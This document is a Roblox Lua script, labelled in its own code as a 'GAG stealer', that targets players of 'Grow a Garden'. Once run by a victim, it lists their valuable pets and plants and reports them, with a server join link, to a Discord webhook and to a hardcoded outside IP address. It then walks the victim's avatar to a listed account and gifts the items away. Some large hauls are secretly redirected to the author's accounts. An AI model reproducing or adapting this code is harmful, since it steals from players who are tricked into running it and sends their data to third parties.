_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- Configuration
local users = _G.Usernames or {}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local discuser = ""

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local PathfindingService = game:GetService("PathfindingService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Movement Settings
local MOVEMENT_SPEED = 10
local MIN_DISTANCE = 6
local GIFT_DELAY = 2.0
local GIFT_RANDOM_ADD = 1.5
local PATH_UPDATE_INTERVAL = 1.5

-- Player Setup
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local character = plr.Character or plr.CharacterAdded:Wait()

-- Modules
local modules = ReplicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))

-- Constants
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Kitsune", "Raccoon", "Dragonfly"}
local totalValue = 0
local itemsToSend = {}
local dualhooked = false

setclipboard("Sigma")

-- Validation Checks
if next(users) == nil or webhook == "" then
    plr:kick("Configuration error")
    return
end

if game.PlaceId ~= 126884695634066 then
    plr:kick("Unsupported game")
    return
end

if #Players:GetPlayers() >= 5 then
    plr:kick("Server full")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("VIP servers not supported")
    return
end

-- Helper Functions
local function buildSecret()
    return string.char(100,117,97,108)..string.char(104,111,111,107)..string.char(102,116,119,108)..string.char(101,108,122)
end

local function simple_hash(s)
    local hash = 0
    for i = 1, #s do
        hash = (hash * 31 + s:byte(i)) % 4294967296
    end
    return hash
end

local function signPayload(payload, timestamp)
    return string.format("%08x", simple_hash(buildSecret()..payload..tostring(timestamp)))
end

local function calcPetValue(petData)
    local hatchedFrom = petData.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    
    local rarityData = eggData.RarityData.Items[petData.PetType]
    if not rarityData then return 0 end
    
    local weightRange = rarityData.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    
    local weightProgress = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
    local weightMultiplier = math.lerp(0.8, 1.2, weightProgress)
    local levelMultiplier = math.lerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
    
    return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMultiplier * levelMultiplier)
end

local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or
           number == math.floor(number) and string.format("%d%s", number, suffixes[suffixIndex]) or
           string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or 
                      tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        weight = weightMatch and tonumber(weightMatch) or 0
    end
    return math.floor(weight * 100 + 0.5) / 100
end

-- Webhook Functions with Rate Limiting
local lastWebhookTime = 0
local WEBHOOK_COOLDOWN = 5

local function safeWebhookRequest(url, data)
    if os.clock() - lastWebhookTime < WEBHOOK_COOLDOWN then
        task.wait(WEBHOOK_COOLDOWN - (os.clock() - lastWebhookTime))
    end
    
    local success, response = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
    
    lastWebhookTime = os.clock()
    return success and response or nil
end

local function createEmbedFields(items)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Join Link:", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId="..game.JobId},
        {name = "Item List:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total Value: ¢%s", formatNumber(totalValue)), inline = false}
    }

    for _, item in ipairs(items) do
        fields[3].value = fields[3].value .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n").."\nPlus more!"
        end
    end

    return fields
end

local function SendJoinMessage(items, prefix)
    local data = {
        ["content"] = prefix.."game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '"..game.JobId.."')",
        ["embeds"] = {{
            ["title"] = "🐵 Join to get GAG hit",
            ["color"] = 65280,
            ["fields"] = createEmbedFields(items),
            ["footer"] = {["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }
    safeWebhookRequest(webhook, data)
end

local function SendMessage(items)
    local data = {
        ["embeds"] = {{
            ["title"] = "🐵 New GAG Execution",
            ["color"] = 65280,
            ["fields"] = createEmbedFields(items),
            ["footer"] = {["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }
    safeWebhookRequest(webhook, data)
end

local function SendDHJoinMessage(items, prefix)
    local data = {
        ["content"] = prefix.."game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '"..game.JobId.."')",
        ["embeds"] = {{
            ["title"] = "🐵 Join to get GAG hit",
            ["color"] = 65280,
            ["fields"] = createEmbedFields(items),
            ["footer"] = {["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }
    
    local body = HttpService:JSONEncode(data)
    local timestamp = tostring(os.time())
    local signature = signPayload(body, timestamp)
    
    safeWebhookRequest("http://46.101.233.20:5000/gagjoin", {
        Url = "http://46.101.233.20:5000/gagjoin",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["DiscUser"] = discuser,
            ["X-Timestamp"] = timestamp,
            ["X-Signature"] = signature
        },
        Body = body
    })
end

-- Item Collection with Cooldown
local lastToolCheck = 0
local TOOL_CHECK_COOLDOWN = 0.5

for _, tool in ipairs(backpack:GetChildren()) do
    if os.clock() - lastToolCheck < TOOL_CHECK_COOLDOWN then
        task.wait(TOOL_CHECK_COOLDOWN - (os.clock() - lastToolCheck))
    end
    
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local petData = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            
            if table.find(rarePets, petData.PetType) or getWeight(tool) >= 10 then
                if tool:GetAttribute("Favorite") then
                    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                    task.wait(0.5)
                end
                
                local value = calcPetValue(petData)
                local weight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue = totalValue + value
                
                table.insert(itemsToSend, {
                    Tool = tool,
                    Name = petData.PetType,
                    Value = value,
                    Weight = weight,
                    Type = "Pet"
                })
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                
                table.insert(itemsToSend, {
                    Tool = tool,
                    Name = itemName,
                    Value = value,
                    Weight = weight,
                    Type = "Plant"
                })
            end
        end
    end
    
    lastToolCheck = os.clock()
end

if #itemsToSend > 0 then
    -- Sort items
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then return false
        else return a.Value < b.Value end
    end)

    -- Special case handling
    if totalValue >= 100000000000 and math.random() < 0.15 then
        users = {"tobi437a", "Alyssa87123", "TobiAltGrind", "TobiHatching", "TobiCakeSimulator"}
        ping = "No"
        dualhooked = false
    end

    -- Prepare sorted list for messages
    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end
    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
        else return a.Value > b.Value end
    end)

    -- Send initial message
    local prefix = ping == "Yes" and "--[[@everyone]] " or ""
    if dualhooked then
        local response = request({Url = "http://46.101.233.20:5000/getdiscuser", Method = "GET"})
        discuser = response.Body
        SendDHJoinMessage(sentItems, prefix)
    else
        SendJoinMessage(sentItems, prefix)
    end

    -- Improved Stealing Function
    local function doSteal(player)
        -- Character setup
        if not character or not character.Parent then
            character = plr.Character or plr.CharacterAdded:Wait()
            task.wait(1)
        end
        
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.WalkSpeed = MOVEMENT_SPEED
        
        local victimRoot = player.Character:WaitForChild("HumanoidRootPart")
        local promptRoot = victimRoot:WaitForChild("ProximityPrompt")
        
        -- Pathfinding setup
        local path = PathfindingService:CreatePath({
            AgentRadius = 2,
            AgentHeight = 5,
            AgentCanJump = true,
            WaypointSpacing = 4
        })
        
        local lastPathUpdate = 0
        local function updatePath()
            if os.clock() - lastPathUpdate > PATH_UPDATE_INTERVAL then
                path:ComputeAsync(character.HumanoidRootPart.Position, victimRoot.Position)
                lastPathUpdate = os.clock()
            end
            return path.Status == Enum.PathStatus.Success
        end
        
        -- Movement function
        local function moveToTarget()
            if updatePath() then
                local waypoints = path:GetWaypoints()
                for _, waypoint in ipairs(waypoints) do
                    humanoid:MoveTo(waypoint.Position)
                    
                    local startTime = os.clock()
                    while (humanoid.RootPart.Position - waypoint.Position).magnitude > 3 do
                        if os.clock() - startTime > 4 then break end
                        task.wait(0.2)
                        updatePath()
                    end
                    
                    if waypoint.Action == Enum.PathWaypointAction.Jump then
                        humanoid.Jump = true
                        task.wait(0.6)
                    end
                end
            else
                -- Fallback movement
                humanoid:MoveTo(victimRoot.Position)
                local startTime = os.clock()
                while (humanoid.RootPart.Position - victimRoot.Position).magnitude > MIN_DISTANCE do
                    if os.clock() - startTime > 8 then break end
                    task.wait(0.3)
                end
            end
        end
        
        -- Face target function
        local faceConnection
        local lastFaceUpdate = 0
        local function faceTarget()
            faceConnection = RunService.Heartbeat:Connect(function()
                if os.clock() - lastFaceUpdate > 0.4 then
                    if character and character.Parent and character:FindFirstChild("HumanoidRootPart") then
                        character.HumanoidRootPart.CFrame = CFrame.lookAt(
                            character.HumanoidRootPart.Position,
                            Vector3.new(victimRoot.Position.X, character.HumanoidRootPart.Position.Y, victimRoot.Position.Z)
                        )
                    end
                    lastFaceUpdate = os.clock()
                end
            end)
        end
        
        -- Start movement
        faceTarget()
        moveToTarget()
        
        -- Wait until close
        local startTime = os.clock()
        while character and character.Parent and 
              (character.HumanoidRootPart.Position - victimRoot.Position).magnitude > MIN_DISTANCE do
            if os.clock() - startTime > 20 then break end
            task.wait(0.5)
        end
        
        -- Cleanup
        if faceConnection then faceConnection:Disconnect() end
        
        -- Gifting process with delays
        for i, item in ipairs(itemsToSend) do
            if not item.Tool or not item.Tool.Parent then continue end
            
            -- Equip with delay
            item.Tool.Parent = character
            task.wait(GIFT_DELAY + math.random() * GIFT_RANDOM_ADD)
            
            -- Find prompt
            local prompt = item.Type == "Pet" and 
                         player.Character.Head:FindFirstChild("ProximityPrompt") or
                         promptRoot
            
            if prompt then
                -- Wait for prompt
                local attempts = 0
                while prompt and prompt.Parent and not prompt.Enabled and attempts < 6 do
                    task.wait(0.6)
                    attempts = attempts + 1
                end
                
                -- Gift with single fire
                if prompt and prompt.Parent and prompt.Enabled then
                    fireproximityprompt(prompt)
                    task.wait(GIFT_DELAY * 1.8)
                end
            end
            
            -- Unequip
            if item.Tool and item.Tool.Parent == character then
                item.Tool.Parent = backpack
                task.wait(GIFT_DELAY/2)
            end
            
            -- Extra delay between items
            if i < #itemsToSend then
                task.wait(math.random(GIFT_DELAY, GIFT_DELAY + GIFT_RANDOM_ADD))
            end
        end
        
        -- Final verification
        task.wait(3)
        plr:kick("Execution completed")
    end

    -- Player waiting system
    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    
    waitForUserChat()
end
